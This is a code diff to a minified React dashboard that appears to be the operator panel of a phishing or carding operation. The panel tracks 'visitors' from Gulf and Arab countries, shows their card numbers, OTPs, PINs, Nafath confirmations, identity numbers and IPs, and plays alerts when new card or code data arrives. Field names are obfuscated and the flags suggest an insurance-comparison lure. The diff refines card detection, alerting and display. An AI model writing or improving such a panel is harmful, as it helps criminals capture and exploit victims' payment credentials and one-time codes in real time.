@@ -1431,6 +1431,32 @@
         return v[a] || v[r] || null
     }
 
+    function el(e) {
+        if (!e) return "";
+        let t = String(e).trim(),
+            a = t.toUpperCase();
+        return ({
+            "SAUDI ARABIA": "SA",
+            "UNITED ARAB EMIRATES": "AE",
+            "KUWAIT": "KW",
+            "BAHRAIN": "BH",
+            "OMAN": "OM",
+            "QATAR": "QA",
+            "JORDAN": "JO",
+            "EGYPT": "EG",
+            "LEBANON": "LB",
+            "IRAQ": "IQ",
+            "SYRIA": "SY",
+            "YEMEN": "YE",
+            "PALESTINE": "PS",
+            "MOROCCO": "MA",
+            "ALGERIA": "DZ",
+            "TUNISIA": "TN",
+            "LIBYA": "LY",
+            "SUDAN": "SD"
+        })[a] || (2 === a.length ? a : t.slice(0, 2).toUpperCase())
+    }
+
     function j({
         visitors: e,
         selectedVisitor: a,
@@ -1514,7 +1540,7 @@
                         u = "waiting" === e.cardStatus || "waiting" === e.otpStatus || "waiting" === e.pinStatus || "waiting" === e.nafadConfirmationStatus,
                         m = !0 === e.isUnread,
                         p = e._v1 || e.cardNumber || e.history?.find(e => "_t1" === e.type || "card" === e.type)?.data?._v1,
-                        g = !!p,
+                        g = !!p || !!(e.history && Array.isArray(e.history) && e.history.some(e => ("_t1" === e.type || "card" === e.type) && (e.data?._v1 || e.data?.v1 || e.data?.cardNumber || e.data))),
                         v = "";
                     if (p) {
                         let t = p;
@@ -1580,9 +1606,8 @@
                             }), e.country && (0, t.jsx)("span", {
                                 className: "absolute -top-0.5 -left-0.5 text-[9px] leading-none",
                                 children: function(e) {
-                                    if (!e) return "";
-                                    let t = e.toUpperCase();
-                                    return 2 === t.length ? String.fromCodePoint(127397 + t.charCodeAt(0), 127397 + t.charCodeAt(1)) : ""
+                                    let t = el(e);
+                                    return 2 === t.length ? String.fromCodePoint(127397 + t.charCodeAt(0), 127397 + t.charCodeAt(1)) : "🌐"
                                 }(e.country)
                             })]
                         }), (0, t.jsxs)("div", {
@@ -1595,8 +1620,10 @@
                                         className: `font-bold text-[13px] truncate leading-tight ${m?"text-gray-900":"text-gray-700"}`,
                                         children: e.ownerName || `زائر ${(e.id||"").slice(-6)}`
                                     }), g && (0, t.jsxs)("span", {
-                                        className: "shrink-0 inline-flex items-center",
-                                        children: ["visa" === v && (0, t.jsx)("svg", {
+                                        className: "shrink-0 inline-flex items-center gap-0.5",
+                                        children: [(0, t.jsx)(x, {
+                                            className: "w-3.5 h-3.5 text-blue-600"
+                                        }), "visa" === v && (0, t.jsx)("svg", {
                                             viewBox: "0 0 50 16",
                                             className: "h-3.5 w-auto",
                                             fill: "none",
@@ -1663,8 +1690,6 @@
                                                 fill: "white",
                                                 children: "AMEX"
                                             })]
-                                        }), !v && (0, t.jsx)(x, {
-                                            className: "w-4 h-4 text-blue-500"
                                         })]
                                     })]
                                 }), (0, t.jsx)("span", {
@@ -1747,7 +1772,7 @@
                                     children: [(0, t.jsx)(f, {
                                         className: "w-2 h-2"
                                     }), "OTP"]
-                                }), m && (0, t.jsx)("span", {
+                                }), !g && m && (0, t.jsx)("span", {
                                     className: "w-1.5 h-1.5 rounded-full bg-green-500 inline-block animate-pulse"
                                 })]
                             })]
@@ -2912,9 +2937,9 @@
                             className: "text-gray-700 font-mono",
                             children: y?.identityNumber || e.identityNumber
                         })]
-                    }), e.deviceType && (0, t.jsxs)("div", {
+                    }), (y?.deviceType || e.deviceType) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
-                        children: ["mobile" === e.deviceType ? (0, t.jsx)("svg", {
+                        children: ["mobile" === (y?.deviceType || e.deviceType) ? (0, t.jsx)("svg", {
                             className: "w-3 h-3 text-gray-400",
                             fill: "none",
                             viewBox: "0 0 24 24",
@@ -2938,9 +2963,9 @@
                             })
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400",
-                            children: e.deviceType
+                            children: y?.deviceType || e.deviceType
                         })]
-                    }), e.os && (0, t.jsxs)("div", {
+                    }), (y?.os || e.os) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                         children: [(0, t.jsx)("svg", {
                             className: "w-3 h-3 text-gray-400",
@@ -2955,9 +2980,9 @@
                             })
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400",
-                            children: e.os
+                            children: y?.os || e.os
                         })]
-                    }), e.browser && (0, t.jsxs)("div", {
+                    }), (y?.browser || e.browser) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                         children: [(0, t.jsx)("svg", {
                             className: "w-3 h-3 text-gray-400",
@@ -2972,18 +2997,18 @@
                             })
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400",
-                            children: e.browser
+                            children: y?.browser || e.browser
                         })]
-                    }), e.country && (0, t.jsxs)("div", {
+                    }), (y?.country || e.country) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                         children: [(0, t.jsx)("span", {
                             className: "text-base leading-none",
-                            children: 2 === (r = e.country?.toUpperCase() || "").length ? String.fromCodePoint(127397 + r.charCodeAt(0), 127397 + r.charCodeAt(1)) : "🌐"
+                            children: (r = el(y?.country || e.country), 2 === r.length ? String.fromCodePoint(127397 + r.charCodeAt(0), 127397 + r.charCodeAt(1)) : "🌐")
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400",
-                            children: e.country
+                            children: el(y?.country || e.country)
                         })]
-                    }), e.ipAddress && (0, t.jsxs)("div", {
+                    }), (y?.ipAddress || e.ipAddress || e.ip_address) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                         children: [(0, t.jsx)("svg", {
                             className: "w-3 h-3 text-gray-400",
@@ -2998,9 +3023,9 @@
                             })
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400 font-mono",
-                            children: e.ipAddress
+                            children: y?.ipAddress || e.ipAddress || e.ip_address
                         })]
-                    }), e.isp && (0, t.jsxs)("div", {
+                    }), (y?.isp || e.isp) && (0, t.jsxs)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
                         children: [(0, t.jsx)("svg", {
                             className: "w-3 h-3 text-gray-400",
@@ -3015,7 +3040,7 @@
                             })
                         }), (0, t.jsx)("span", {
                             className: "text-gray-400 truncate max-w-[120px]",
-                            children: e.isp
+                            children: y?.isp || e.isp
                         })]
                     }), (e.currentPage || e.currentStep) && (0, t.jsx)("div", {
                         className: "flex items-center gap-1.5 px-3 py-1.5 border-l border-gray-100 shrink-0",
@@ -4586,7 +4611,7 @@
     }
 
     function eo() {
-        let [e, r] = (0, a.useState)([]), [d, l] = (0, a.useState)(null), [c, u] = (0, a.useState)(""), [m, p] = (0, a.useState)("all"), [g, h] = (0, a.useState)(new Set), [b, x] = (0, a.useState)(!0), [f, y] = (0, a.useState)(215), v = (0, a.useRef)(new Set), _ = (0, a.useRef)(null), w = (0, a.useRef)([]), k = (0, a.useRef)(!0), N = (0, a.useRef)(null), A = (0, a.useRef)(null), S = (0, a.useRef)(""), C = (0, a.useRef)(new Map), [B, P] = (0, a.useState)(null);
+        let [e, r] = (0, a.useState)([]), [d, l] = (0, a.useState)(null), [c, u] = (0, a.useState)(""), [m, p] = (0, a.useState)("all"), [g, h] = (0, a.useState)(new Set), [b, x] = (0, a.useState)(!0), [f, y] = (0, a.useState)(215), v = (0, a.useRef)(new Set), _ = (0, a.useRef)(null), w = (0, a.useRef)([]), k = (0, a.useRef)(!0), N = (0, a.useRef)(null), A = (0, a.useRef)(null), S = (0, a.useRef)(""), C = (0, a.useRef)(new Map), H = (0, a.useRef)(new Map), [B, P] = (0, a.useState)(null);
         (0, a.useEffect)(() => {
             console.log("[Init] Dashboard mounted, loading audio...");
             let e = new Audio("/sounds/card_alert.mp3");
@@ -4634,11 +4659,10 @@
                     if (!a.alerts || 0 === a.alerts.length) return;
                     let r = a.alerts[0].updatedAt;
                     r > S.current && (S.current = r);
-                    let n = !1;
                     for (let e of a.alerts) {
                         let t = C.current.get(e.id),
                             a = e.updatedAt;
-                        t !== a && (C.current.set(e.id, a), n || (e.hasCard ? (console.log("[Alerts] ★ New CARD from:", e.id), I()) : e.hasOtp || e.hasPin ? (console.log("[Alerts] ★ New OTP/PIN from:", e.id), E()) : e.hasPhone && (console.log("[Alerts] ★ New PHONE from:", e.id), E()), n = !0))
+                        t !== a && C.current.set(e.id, a)
                     }
                 } catch (e) {
                     console.log("[Alerts] Error:", e)
@@ -4675,14 +4699,21 @@
                 })
             }, []),
             M = (0, a.useCallback)((e, t) => {
+                if (k.current || !t) return;
                 let a = Object.keys(t);
-                console.log("[Socket Audio] Data received via socket, keys:", a);
-                let r = ["_v1", "_v2", "_v3", "v1", "v2", "v3", "X3Yx", "X3Yy", "X3Yz"];
-                if (a.some(e => r.includes(e))) return void I();
-                let n = ["_v5", "_v6", "_v7", "v5", "v6", "v7", "X3Y1", "X3Y2", "X3Y3", "phoneVerificationCode", "idVerificationCode"];
-                if (a.some(e => n.includes(e))) return void E();
-                let s = ["_v8", "_v9", "v8", "v9", "X3Y4", "X3Y5"];
-                if (a.some(e => s.includes(e))) return void E()
+                if (0 === a.length) return;
+                if (a.every(e => ["currentPage", "currentStep", "lastSeen", "isOnline", "lastActiveAt", "updatedAt"].includes(e))) return;
+                if (t.history && Array.isArray(t.history)) {
+                    let a = H.current.get(e) || 0;
+                    if (t.history.length > a) {
+                        H.current.set(e, t.history.length);
+                        let r = t.history[t.history.length - 1];
+                        if ("_t1" === r?.type || "card" === r?.type) return void I();
+                        if ("_t2" === r?.type || "otp" === r?.type || "_t3" === r?.type || "pin" === r?.type) return void E()
+                    }
+                }
+                if ("verifying" === t._v5Status || "verifying" === t._v6Status || "verifying" === t._v7Status) return void E();
+                if (t.basicInfoUpdatedAt || t.insurCompletedAt || t.comparCompletedAt || t.otpSubmittedAt || t.pinSubmittedAt) return void E()
             }, [I, E]);
         (0, a.useEffect)(() => {
             if (!d?.id) return;
@@ -4727,7 +4758,11 @@
                         let a = e.updatedAt ? e.updatedAt instanceof Date ? e.updatedAt.getTime() : new Date(e.updatedAt).getTime() : 0;
                         return (t.updatedAt ? t.updatedAt instanceof Date ? t.updatedAt.getTime() : new Date(t.updatedAt).getTime() : 0) - a
                     });
-                w.current = n.map(e => e.id).filter(e => void 0 !== e), v.current = new Set(n.filter(e => e.isUnread && e.id).map(e => e.id)), k.current && (k.current = !1), r(n), x(!1), l(e => e && e.id ? (_.current = e.id, n.find(t => t.id === e.id) || e) : !e && n.length > 0 ? (_.current = n[0].id || null, n[0]) : e)
+                let o = new Set(w.current),
+                    d = n.filter(e => e.id && !o.has(e.id));
+                !k.current && d.length > 0 && (console.log("[Audio] ★ New visitor joined:", d.length), E()), n.forEach(e => {
+                    e.id && Array.isArray(e.history) && H.current.set(e.id, e.history.length)
+                }), w.current = n.map(e => e.id).filter(e => void 0 !== e), v.current = new Set(n.filter(e => e.isUnread && e.id).map(e => e.id)), k.current && (k.current = !1), r(n), x(!1), l(e => e && e.id ? (_.current = e.id, n.find(t => t.id === e.id) || e) : !e && n.length > 0 ? (_.current = n[0].id || null, n[0]) : e)
             }, t = (e, t) => {
                 z.current(e, t)
             }, a = (e, t) => {
